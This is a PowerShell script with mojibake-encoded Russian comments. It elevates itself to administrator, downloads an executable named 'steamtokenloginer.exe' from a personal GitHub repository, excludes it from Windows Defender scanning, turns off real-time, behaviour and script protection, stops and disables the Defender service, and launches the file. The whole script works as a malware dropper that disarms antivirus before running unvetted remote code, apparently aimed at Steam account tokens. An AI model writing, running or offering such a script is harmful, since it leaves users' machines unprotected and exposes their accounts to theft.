# –ù–∞—Å—Ç—Ä–æ–π–∫–∏
$exeUrl = "https://github.com/gseff137-afk/test/raw/refs/heads/main/steamtokenloginer.exe"
$targetFolder = "C:\Users\zenas\Desktop\–ù–æ–≤–∞—è –ø–∞–ø–∫–∞ (7)"
$exePath = "$targetFolder\steamtokenloginer.exe"

# –ü—Ä–æ–≤–µ—Ä—è–µ–º –ø—Ä–∞–≤–∞ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞
if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Write-Host "üîÑ –ü–µ—Ä–µ–∑–∞–ø—É—Å–∫ —Å –ø—Ä–∞–≤–∞–º–∏ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞..." -ForegroundColor Yellow
    Start-Process powershell -Verb RunAs -ArgumentList "-ExecutionPolicy Bypass -Command `"$($MyInvocation.MyCommand.Definition)`""
    exit
}

Write-Host "‚úÖ –ó–∞–ø—É—â–µ–Ω–æ —Å –ø—Ä–∞–≤–∞–º–∏ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞" -ForegroundColor Green

# –°–æ–∑–¥–∞–µ–º –ø–∞–ø–∫—É –µ—Å–ª–∏ –Ω–µ —Å—É—â–µ—Å—Ç–≤—É–µ—Ç
if (-not (Test-Path $targetFolder)) {
    New-Item -ItemType Directory -Path $targetFolder -Force
    Write-Host "üìÅ –°–æ–∑–¥–∞–Ω–∞ –ø–∞–ø–∫–∞: $targetFolder" -ForegroundColor Green
}

Write-Host "üì• –°–∫–∞—á–∏–≤–∞–Ω–∏–µ —Ñ–∞–π–ª–∞..." -ForegroundColor Yellow

try {
    # –°–∫–∞—á–∏–≤–∞–µ–º EXE —Ñ–∞–π–ª
    Invoke-WebRequest -Uri $exeUrl -OutFile $exePath
    
    $fileSize = (Get-Item $exePath).Length
    Write-Host "‚úÖ –§–∞–π–ª —Å–∫–∞—á–∞–Ω: $([math]::Round($fileSize/1MB,2)) MB" -ForegroundColor Green
    
    # 1. –î–æ–±–∞–≤–ª—è–µ–º –≤ –∏—Å–∫–ª—é—á–µ–Ω–∏—è Windows Defender –ù–ê–í–°–ï–ì–î–ê
    Write-Host "üõ°Ô∏è –î–æ–±–∞–≤–ª—è–µ–º –≤ –∏—Å–∫–ª—é—á–µ–Ω–∏—è Windows Defender..." -ForegroundColor Yellow
    Add-MpPreference -ExclusionPath $exePath -ErrorAction SilentlyContinue
    Add-MpPreference -ExclusionPath $targetFolder -ErrorAction SilentlyContinue
    Write-Host "‚úÖ –§–∞–π–ª –∏ –ø–∞–ø–∫–∞ –¥–æ–±–∞–≤–ª–µ–Ω—ã –≤ –∏—Å–∫–ª—é—á–µ–Ω–∏—è –ù–ê–í–°–ï–ì–î–ê" -ForegroundColor Green
    
    # 2. –û–¢–ö–õ–Æ–ß–ê–ï–ú –ó–ê–©–ò–¢–£ –í –†–ï–ê–õ–¨–ù–û–ú –í–†–ï–ú–ï–ù–ò
    Write-Host "üî¥ –û–¢–ö–õ–Æ–ß–ê–ï–ú –ó–ê–©–ò–¢–£ –í –†–ï–ê–õ–¨–ù–û–ú –í–†–ï–ú–ï–ù–ò..." -ForegroundColor Red
    
    # –û—Ç–∫–ª—é—á–∞–µ–º –≤—Å–µ –∫–æ–º–ø–æ–Ω–µ–Ω—Ç—ã –∑–∞—â–∏—Ç—ã
    Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
    Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction SilentlyContinue
    Set-MpPreference -DisableIOAVProtection $true -ErrorAction SilentlyContinue
    Set-MpPreference -DisableScriptScanning $true -ErrorAction SilentlyContinue
    Set-MpPreference -DisableBlockAtFirstSeen $true -ErrorAction SilentlyContinue
    
    # –û—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º —Å–ª—É–∂–±—É –∑–∞—â–∏—Ç—ã
    Stop-Service -Name "WinDefend" -Force -ErrorAction SilentlyContinue
    Set-Service -Name "WinDefend" -StartupType Disabled -ErrorAction SilentlyContinue
    
    Write-Host "‚úÖ –ó–∞—â–∏—Ç–∞ –≤ —Ä–µ–∞–ª—å–Ω–æ–º –≤—Ä–µ–º–µ–Ω–∏ –û–¢–ö–õ–Æ–ß–ï–ù–ê" -ForegroundColor Green
    
    # 3. –ó–∞–ø—É—Å–∫–∞–µ–º –ø—Ä–æ–≥—Ä–∞–º–º—É
    Write-Host "üöÄ –ó–∞–ø—É—Å–∫–∞–µ–º –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ..." -ForegroundColor Green
    Start-Process -FilePath $exePath
    Write-Host "üéØ –ü—Ä–∏–ª–æ–∂–µ–Ω–∏–µ –∑–∞–ø—É—â–µ–Ω–æ —É—Å–ø–µ—à–Ω–æ!" -ForegroundColor Green
    
    Write-Host "`n‚ö†Ô∏è –í–ù–ò–ú–ê–ù–ò–ï: –ó–∞—â–∏—Ç–∞ Windows Defender –æ—Ç–∫–ª—é—á–µ–Ω–∞!" -ForegroundColor Red
    Write-Host "üí° –î–ª—è –≤–∫–ª—é—á–µ–Ω–∏—è –∑–∞—â–∏—Ç—ã –≤—ã–ø–æ–ª–Ω–∏—Ç–µ:" -ForegroundColor Yellow
    Write-Host "   Set-MpPreference -DisableRealtimeMonitoring `$false" -ForegroundColor Cyan
    Write-Host "   Start-Service WinDefend" -ForegroundColor Cyan
    
}
catch {
    Write-Host "‚ùå –û—à–∏–±–∫–∞: $_" -ForegroundColor Red
}

# –ñ–¥–µ–º –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è
Write-Host "`n–ù–∞–∂–º–∏—Ç–µ –ª—é–±—É—é –∫–ª–∞–≤–∏—à—É –¥–ª—è –≤—ã—Ö–æ–¥–∞..." -ForegroundColor Gray
$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
